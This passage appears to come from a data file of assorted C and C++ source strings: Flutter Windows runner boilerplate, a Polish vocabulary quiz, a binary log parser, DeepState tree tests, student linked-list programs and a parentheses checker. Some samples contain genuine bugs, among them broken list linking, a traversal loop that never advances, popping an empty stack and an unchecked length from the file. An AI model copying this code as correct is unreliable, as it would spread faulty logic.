ui->mainAttribute->setText(QString(\"\u6cbb\u7597\u52a0\u6210 %1\").arg(5.6+level*6.06,1)+\"%\");\r\n        else if(guan<=86)\r\n            ui->mainAttribute->setText(QString(\"\u66b4\u51fb\u4f24\u5bb3 %1\").arg(9.3+level*7.92,1)+\"%\";\r\n        else if(guan<=96)\r\n            ui->mainAttribute->setText(\"\u66b4\u51fb\u7387 4.7%",
    "\ufeff// QuizletXD.cpp : Ten plik zawiera funkcj\u0119 \u201emain\u201d. W nim rozpoczyna si\u0119 i ko\u0144czy wykonywanie programu.\n//CTRL + F5 odpalasz \n\n#include<iostream>\n#include<cstdlib>\n#include<fstream>\n#include<string>\n#include<ctime>\n#include<cmath>\nusing namespace std;\n\nint ILOSC_SLOW = 318; // Tu wpisujesz ile jest wierszy w pliku (te poziome(plasko)) po czym naciskasz   CTRL + S  (plus oznacza, ze te dwa guziki xD)\n\n\nint generowanieNumeruSlowaWisielec() {\n\tsrand(time(NULL));\n\n\tint numerSlowa = (rand() * 2137 % (ILOSC_SLOW * 2));\n\tif (numerSlowa % 2 == 0) {\n\t\tnumerSlowa++;\n\t}\n\treturn numerSlowa;\n}\n\nvoid generowanieSlowaDoOdgadniecia(int numerSlowa, char* slowoDoOdgadniecia) {\n\tchar pusteWczytanie[80] = { 0 };\n\tfstream wczytanieSlowaZPliku;\n\twczytanieSlowaZPliku.open(\"Slowniczek_muzyczny.txt\", ios::in);// pomiedzy znakami \"Tu_Wpisujesz_Nazwe_Swojego_Pliku.txt\" nie zapomnij .txt na ko\u0144cu a potem CTRL+S    \n\t//Nazwa pliku musi by\u0107 bez polskich znakow i zamiast spacji wpisz _ (Shift + -  =  _  )\n\tfor (int j = 1; j < numerSlowa; j++) {\n\t\twczytanieSlowaZPliku >> pusteWczytanie;\n\t}\n\twczytanieSlowaZPliku >> slowoDoOdgadniecia;\n}\n\nint main()\n{\n\tbool kontynuacja = true;\n\tint punkty = 0;\n\tint bledy = 0;\n\tint przyklad = 0;\n\twhile (kontynuacja) {\n\t\tint numer = generowanieNumeruSlowaWisielec();\n\t\tprzyklad++;\n\t\tchar slowo_do_odgadniecia[80] = { 0 };\n\t\tchar slowo_do_odgadniecia2[80] = { 0 };\n\t\tgenerowanieSlowaDoOdgadniecia(numer, slowo_do_odgadniecia);\n\t\tgenerowanieSlowaDoOdgadniecia(numer + 1, slowo_do_odgadniecia2);\n\t\tstd::cout << \"Slowo do odgadniecia nr.\" << przyklad << \" to:\\n\" << slowo_do_odgadniecia << endl;\n\t\tchar slowo_zgadywane[30] = { 0 };\n\t\tcin >> slowo_zgadywane;\n\t\tcout << slowo_do_odgadniecia2 << endl << \"Czy napisalas dobrze?\\n 1=tak\\t2=nie\\t3=inne tlumaczenie\\ninne = koniec\\n\";\n\t\tint dobrze = 0;\n\t\tcin >> dobrze;\n\t\tif (dobrze == 1) {\n\t\t\tpunkty++;\n\t\t}\n\t\telse if (dobrze == 2) {\n\t\t\tbledy++;\n\t\t}\n\t\telse if (dobrze == 3) {\n\t\t\tprzyklad--;\n\t\t}\n\t\telse {\n\t\t\tcout << \"WTF?! co ty wpisalas? Przestajemy sie lubic i sie wylaczam \\n>:(\\n\";\n\t\t\tkontynuacja = false;\n\t\t}\n\t\tcout << \"Twoje punkty to:\\nDobrze:\" << punkty << \"\\nzle:\\t\" << bledy << endl;\n\t\tsystem(\"PAUSE\");\n\t\tsystem(\"CLS\");\n\t}\n}\n\n\n\n// Uruchomienie programu: Ctrl + F5 lub menu Debugowanie > Uruchom bez debugowania\n// Debugowanie programu: F5 lub menu Debugowanie > Rozpocznij debugowanie\n\n// Porady dotycz\u0105ce rozpoczynania pracy:\n//   1. U\u017cyj okna Eksploratora rozwi\u0105za\u0144, aby doda\u0107 pliki i zarz\u0105dza\u0107 nimi\n//   2. U\u017cyj okna programu Team Explorer, aby nawi\u0105za\u0107 po\u0142\u0105czenie z kontrol\u0105 \u017ar\u00f3d\u0142a\n//   3. U\u017cyj okna Dane wyj\u015bciowe, aby sprawdzi\u0107 dane wyj\u015bciowe kompilacji i inne komunikaty\n//   4. U\u017cyj okna Lista b\u0142\u0119d\u00f3w, aby zobaczy\u0107 b\u0142\u0119dy\n//   5. Wybierz pozycj\u0119 Projekt > Dodaj nowy element, aby utworzy\u0107 nowe pliki kodu, lub wybierz pozycj\u0119 Projekt > Dodaj istniej\u0105cy element, aby doda\u0107 istniej\u0105ce pliku kodu do projektu\n//   6. Aby w przysz\u0142o\u015bci ponownie otworzy\u0107 ten projekt, przejd\u017a do pozycji Plik > Otw\u00f3rz > Projekt i wybierz plik sln\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "\n// LogiParser.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\n#include <fstream>\n#include <vector>\n#include <algorithm>\n\nusing namespace std;\n\ntypedef unsigned char Byte;\ntypedef int Int32;\n\n/// <summary>\n/// A structure which represents a message.\n/// </summary>\nstruct LogiMessage\n{\n    LogiMessage() : sequenceNumber(0), length(0), message(NULL) {}\n\n    Int32 sequenceNumber;\n    Int32 length;\n    char* message;\n};\n\n/// <summary>\n/// Checks the endianness of the system.\n/// </summary>\n/// <returns>true if the system is little-endian.</returns>\nbool isLittleEndian()\n{\n    const int value = 0x01;\n    const void* address = static_cast<const void*>(&value);\n    const unsigned char* leastSignificantAddress = static_cast<const unsigned char*>(address);\n    return *leastSignificantAddress == 0x01;\n}\n\n/// <summary>\n/// Helper function for endianness conversion.\n/// </summary>\n/// <typeparam name=\"T\">The type of the argument.</typeparam>\n/// <param name=\"pObj\">The pointer to the object.</param>\ntemplate <typename T>\nvoid endSwap(T* pObj)\n{\n    Byte* pMem = reinterpret_cast<Byte*>(pObj);\n    reverse(pMem, pMem + sizeof(T));\n}\n\nint main(int argc, char* argv[])\n{\n    // Check whether the file name is supplied.\n    if (argc < 2)\n    {\n        cout << \"Please specify a file name.\\n\";\n        return 1;\n    }\n\n    // Open the file.\n    ifstream stream(argv[1], ios::binary);\n\n    // Check whether the file is good.\n    if (!stream.good())\n    {\n        cout << \"Could not read the file.\\n\";\n        return 1;\n    }\n\n    // Read the file into LogiMessage items.\n    vector<LogiMessage> messages;\n    while (!stream.eof())\n    {\n        LogiMessage msg;\n\n        // Read the length.\n        stream.read((char*)&msg.length, sizeof(Int32));\n\n        // If there is no message, skip.\n        if (!msg.length)\n            continue;\n\n        // Read the sequence number.\n        stream.read((char*)&msg.sequenceNumber, sizeof(Int32));\n\n        // If the system is not little-endian, swap the bytes.\n        if (!isLittleEndian())\n        {\n            endSwap(&msg.sequenceNumber);\n            endSwap(&msg.length);\n        }\n\n        // Read the actual message content.\n        msg.message = (char*)malloc(msg.length + 1);\n        stream.read(msg.message, msg.length);\n        msg.message[msg.length] = '\\0';\n\n        messages.push_back(msg);\n    }\n\n    // Close the file resource.\n    stream.close();\n\n    // Output the messages, or they can be utilised in another way.\n    for (LogiMessage msg : messages)\n    {\n        printf(\"%d| %s\\n\", msg.sequenceNumber, msg.message);\n    }\n\n    return 0;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"email_send\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <deepstate/DeepState.hpp>\n#include \"tree.h\"\n\nusing namespace deepstate;\n\nTEST(BinarySearchTree, InsertSearchRemove) {\n    BinarySearchTree bst;\n\n    // Insert random keys into the tree\n    for (int i = 0; i < 100; ++i) {\n        int key = DeepState_IntInRange(0, 1000);\n        bst.insert(key);\n    }\n\n    // Search for random keys\n    for (int i = 0; i < 100; ++i) {\n        int key = DeepState_Int();\n        bst.search(key);\n    }\n\n    // Remove random keys\n    for (int i = 0; i < 100; ++i) {\n        int key = DeepState_Int();\n        bst.remove(key);\n    }\n}\n\nTEST(BinarySearchTree, Traversal) {\n    BinarySearchTree bst;\n\n    // Insert random keys into the tree\n    for (int i = 0; i < 100; ++i) {\n        int key = DeepState_IntInRange(0, 1000);\n        bst.insert(key);\n    }\n\n    // Perform traversal\n    bst.inorderTraversal();\n    bst.preorderTraversal();\n    bst.postorderTraversal();\n}\n\nTEST(BinarySearchTree, EmptyTree) {\n    BinarySearchTree bst;\n\n    // Perform operations on an empty tree\n    ASSERT_FALSE(bst.search(10));\n    bst.remove(10);\n}\n\nTEST(BinarySearchTree, RemoveRoot) {\n    BinarySearchTree bst;\n\n    // Insert a key and remove it\n    bst.insert(50);\n    bst.remove(50);\n    ASSERT_FALSE(bst.search(50));\n}\n\nTEST(BinarySearchTree, RemoveNonexistentKey) {\n    BinarySearchTree bst;\n\n    // Insert some keys\n    bst.insert(50);\n    bst.insert(30);\n    bst.insert(70);\n\n    // Try removing a key that doesn't exist\n    bst.remove(40);\n    ASSERT_FALSE(bst.search(40));\n}\n\n",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct Node\n{\n    int noMhs;\n    string name;\n    Node* next;\n    Node* prev;\n};\n\nNode* START = NULL;\n\nvoid addNode(){\n    Node* newNode = new Node(); // step 1 : create a new node\n    cout << \"\\nEnter the roll number of the student : \";\n    cin >> newNode->noMhs;      // assign value to the data field of the new node\n    cout << \"\\nEnter the name of the student : \";\n    cin >> newNode->name;      // assign value to the data field of the new node\n\n    // Insert the nw node in the list\n    if (START != NULL && newNode->noMhs == START->noMhs) {\n\n        if (START != NULL && newNode->noMhs == START->noMhs){\n            cout << \"\\033[31mDuplicate roll not allowed\\033]0m\" << endl;\n            return;\n        }\n        // if the list empty, make the new node the START\n        newNode->next = START; // step 3 : make the new node point to the first node\n        if (START != NULL) {\n            START->prev = newNode; // step 4 : make the first node point to the new node\n        }\n        newNode->prev = NULL; // step 5 : make the new node point to NULL\n        START = newNode; // step 6 : make the new node the first node\n    }\n    else{\n        // insert the new node in the middle or at the end\n        Node *current = START; // step 1.a : start from the first node\n        Node *previous = NULL; // step 1.b : previous node is NULL initially\n\n        while (current != NULL && current->noMhs < newNode->noMhs) // step 1.c traverse the list to find the correct position\n        {\n            previous = current; // step 1.d : move the previous to the current node\n            current = current->next; // step 1.e : move the currrent to the next node\n        }\n\n        newNode->next = previous; // step 4 : make the next field of the new node point to current\n        newNode->prev = previous; // step 5 : make the previous field of the new node point to previous\n\n        if (current != NULL)\n        {\n            current->prev = newNode; // step 6 : make the next previous field of the current node point ti the new world\n        }\n\n        if (previous != NULL)\n        {\n            previous->next =newNode; // step 7 : make the next field of the previous node point to the new node\n        }\n        else\n        {\n            // if previous is still NULL, it means newNode is now the first node\n            START = newNode;\n        }\n    }\n    \n}\n\nbool search(int rollNo, Node **previous, Node **current)\n{\n    *previous = NULL;\n    *current = START;\n    while (*current != NULL && (*current)->noMhs != rollNo)\n    {\n        *previous = * current;\n        *current = (*current)->next;\n    }\n    return (*current != NULL);\n}\n\nvoid deleteNode()\n{\n    Node *previous, *current;\n    int rollNo;\n\n    cout <<\"\\nEnter the roll number of the student whose record is to be deleted : \";\n    cin >> rollNo; // step 3 : get the roll number to be deleted\n\n    if (START == NULL)\n    {\n        cout << \"List is empty\" << endl;\n        return;\n    }\n\n    current = START; // step 1 : start from the first node\n    previous = NULL;\n\n    // Locate the node to be deleted\n    while (current != NULL && current->noMhs != rollNo)\n    {\n        cout << \"\\033[31mThe record wtih toll number \" << rollNo << \" not found\\033[0m\" << endl;\n        return;\n    }\n\n    // Node to be deleted is the first node\n    if (current == START)\n    {\n        START = START->next; // step 2 : update the START pointer\n        if (START != NULL)\n        {\n           START->prev = NULL; \n        }\n    }\n    else\n    { // Node to be deletd is not the first node\n        previous->next = current->next;\n        if (current->next != NULL)\n        { // if there's a succesor, update is prev pointer\n            current->next->prev = previous;\n        } \n    }\n\n    // release the memory of the node marked as current\n    delete current;\n    cout << \"\\x1b[32mRecord with roll number \" << rollNo << \" deleted\\x1b[0m\" << endl;\n}\n\nbool listEmpty()\n{\n    return (START == NULL);\n}\n\nvoid traverse()\n{\n    if (listEmpty())\n        cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecords in ascending order of roll number are : \" << endl;\n        Node *currentNode = START; // step 1\n        while (currentNode != NULL) // step 2\n        {\n            cout << currentNode->noMhs << \" \" << currentNode->name << endl; // step 3\n        }\n    }\n}\n\nvoid revtravese()\n{\n    if (listEmpty())\n    cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecords in descending order of roll number are : \" << endl;\n        Node *currentNode = START;\n        while (currentNode->next != NULL)\n            currentNode = currentNode->next;\n\n        while (currentNode != NULL)\n        {\n            cout << currentNode->noMhs << \" \" << currentNode->name << endl;\n            currentNode = currentNode->prev;\n        }\n        \n    }\n    \n}\nvoid searchData(){\n    if (listEmpty() == true)\n    {\n        cout << \"\\nList is empty\" << endl;\n    }\n    Node ",
    "#include <iostream>\nusing namespace std;\n\nstruct Node {\n    int noMhs;\n    string name;\n    Node* next;\n    Node* prev;\n};\n\nNode* START = NULL;\n\nvoid addNode() {\n\tNode* newNode = new Node();\n\tcout << \"\\nEnter the roll number of the student: \";\n\tcin >> newNode->noMhs;\n\tcout << \"\\nEnter the name of the student: \";\n\tcin >> newNode->name;\n\n\tif (START == NULL || newNode->noMhs <= START->noMhs) {\n\n\t\tif (START != NULL && newNode->noMhs == START->noMhs) {\n\t\t\tcout << \"\\033[31mDuplicate roll numbers not allowed\\033[0m\" << endl;\n\t\t\treturn;\n\t\t}\n\t\tnewNode->next = START;\n\t\tif (START != NULL) {\n\t\t\tSTART->prev = newNode;\n\t\t}\n\t\tnewNode->prev = NULL;\n\t\tSTART = newNode;\n\t}\n\telse {\n\t\tNode* current = START;\n\t\tNode* previous = NULL;\n\n\t\twhile (current != NULL && current->noMhs < newNode->noMhs)\n\t\t{\n\t\t\tprevious = current;\n\t\t\tcurrent = current->next;\n\t\t}\n\t\tnewNode->next = current;\n\t\tnewNode->prev = previous;\n\n\t\tif (current != NULL)\n\t\t{\n\t\t\tcurrent->prev = newNode;\n\t\t}\n\n\t\tif (previous != NULL)\n\t\t{\n\t\t\tprevious->next = newNode;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tSTART = newNode;\n\t\t}\n\t}\n}\n\nbool search(int rollNo, Node** previous, Node** current)\n{\n\t*previous = NULL;\n\t*current = START;\n\twhile (*current != NULL && (*current)->noMhs != rollNo)\n\t{\n\t\t*previous = *current;\n\t\t*current = (*current)->next;\n\t}\n\treturn (*current != NULL);\n}\n\nvoid deleteNode()\n{\n\tNode* previous, * current;\n\tint rollNo;\n\n\tcout << \"\\nEnter the roll number of the student whose record is to be deleted: \";\n\tcin >> rollNo;\n\n\tif (START == NULL)\n\t{\n\t\tcout << \"List is empty\" << endl;\n\t\treturn;\n\t}\n\n\tcurrent = START;\n\tprevious = NULL;\n\n\twhile (current != NULL && current->noMhs != rollNo)\n\t{\n\t\tprevious = current;\n\t\tcurrent = current->next;\n\t}\n\tif (current == NULL)\n\t{\n\t\tcout << \"\\033[31mThe record with roll number \" << rollNo << \" not found\\033[0m\" << endl;\n\t\treturn;\n\t}\n\tif (current == START)\n\t{\n\t\tSTART = START->next;\n\t\tif (START != NULL)\n\t\t{\n\t\t\tSTART->prev = NULL;\n\t\t}\n\t}\n\telse\n\t{\n\t\tprevious->next = current->next;\n\t\tif (current->next != NULL)\n\t\t{\n\t\t\tcurrent->next->prev = previous;\n\t\t}\n\t}\n\tdelete current;\n\tcout << \"\\x1b[32mRecord with roll number \" << rollNo << \" delete\\x1b[0m\" << endl;\n}\n\nbool listEmpty()\n{\n\treturn (START == NULL);\n}\n\nvoid traverse() \n{\n\tif (listEmpty())\n\t\tcout << \"\\nList is empty\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecords in ascending order of roll number are:\" << endl;\n\t\tNode* currentNode = START;\n\t\twhile (currentNode != NULL)\n\t\t{\n\t\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl;\n\t\t\tcurrentNode = currentNode->next;\n\t\t}\n\t}\n}\n\nvoid revtraverse()\n{\n\tif (listEmpty())\n\t\tcout << \"\\nList is empty\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecord in descending order of roll number are:\" << endl;\n\t\tNode* currentNode = START;\n\t\twhile (currentNode->next != NULL)\n\t\t\tcurrentNode = currentNode->next;\n\n\t\twhile (currentNode != NULL)\n\t\t{\n\t\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl;\n\t\t\tcurrentNode = currentNode->prev;\n\t\t}\n\t}\n}\n\nvoid searchData()\n{\n\tif (listEmpty() == true)\n\t{\n\t\tcout << \"\\nList is empty\" << endl;\n\t}\n\n\tNode* prev, * curr;\n\tprev = curr = NULL;\n\tcout << \"\\nEnter the roll number of the student whose record you want to search: \";\n\tint num;\n\tcin >> num;\n\tif (search(num, &prev, &curr) == false)\n\t\tcout << \"\\nRecord not found\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecord found\" << endl;\n\t\tcout << \"\\nRoll number: \" << curr->noMhs << endl;\n\t\tcout << \"\\nName: \" << curr->name << endl;\n\t}\n}\n\nint main()\n{\n\twhile (true)\n\t{\n\t\ttry\n\t\t{\n\t\t\tcout << \"\\nMenu\" << endl;\n\t\t\tcout << \"1. Add a record to the list\" << endl;\n\t\t\tcout << \"2. Delete a record from the list\" << endl;\n\t\t\tcout << \"3. View all records in the ascending order of roll numbers\" << endl;\n\t\t\tcout << \"4. View all records in the descending order of roll numbers\" << endl;\n\t\t\tcout << \"5. Search for a record in the list\" << endl;\n\t\t\tcout << \"6.Exit\" << endl;\n\t\t\tcout << \"\\nEnter your choice (1-6): \";\n\t\t\tchar ch;\n\t\t\tcin >> ch;\n\n\t\t\tswitch (ch)\n\t\t\t{\n\t\t\tcase '1':\n\t\t\t\taddNode();\n\t\t\t\tbreak;\n\t\t\tcase '2':\n\t\t\t\tdeleteNode();\n\t\t\t\tbreak;\n\t\t\tcase '3':\n\t\t\t\ttraverse();\n\t\t\t\tbreak;\n\t\t\tcase '4':\n\t\t\t\trevtraverse();\n\t\t\t\tbreak;\n\t\t\tcase '5':\n\t\t\t\tsearchData();\n\t\t\t\tbreak;\n\t\t\tcase '6':\n\t\t\t\treturn 0;\n\t\t\tdefault:\n\t\t\t\tcout << \"\\nInvalid option\" << endl;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tcatch (exception& e)\n\t\t{\n\t\t\tcout << \"Chek for the values entered.\" << endl;\n\t\t}\n\t}\n}\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"currency_converter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <iomanip>\r\n#include <stack>\r\n#include <string>\r\nusing namespace std;\r\n\r\n// Function used to check if the parentheses in the expression are balanced or not\r\nbool balancedParentheses(string expr)\r\n{\r\n    // Stack of characters named p because the expression will contain parentheses\r\n    stack<char> p;\r\n    // for loop used in order to traverse the expression of parentheses\r\n    for (int i = 0; i < expr.length(); i++)\r\n    {\r\n        // If the expression contains open parentheses, meaning '('\r\n        if (expr[i] == '(')\r\n            p.push(expr[i]);\r\n        else\r\n            p.pop();\r\n    }\r\n    // Return empty stack\r\n    return (p.empty());\r\n}\r\n\r\n// main function, which will take the input from the user and display the output\r\n// of whether or not the expression contains balanced parentheses\r\nint main()\r\n{\r\n    string parenthesesExpression;\r\n    // The user inputting the parentheses expression that either does or does not have balanced parentheses.\r\n    cin >> parenthesesExpression;\r\n    if (balancedParentheses(parenthesesExpression))\r\n        // Output that will be displayed if the expression has balanced parentheses.\r\n        cout << \"Balanced\";\r\n    else\r\n        // Output that will be displayed if the expression's parentheses are not balanced.\r\n        cout << \"Not Balanced\";\r\n    return 0;\r\n}\r\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return 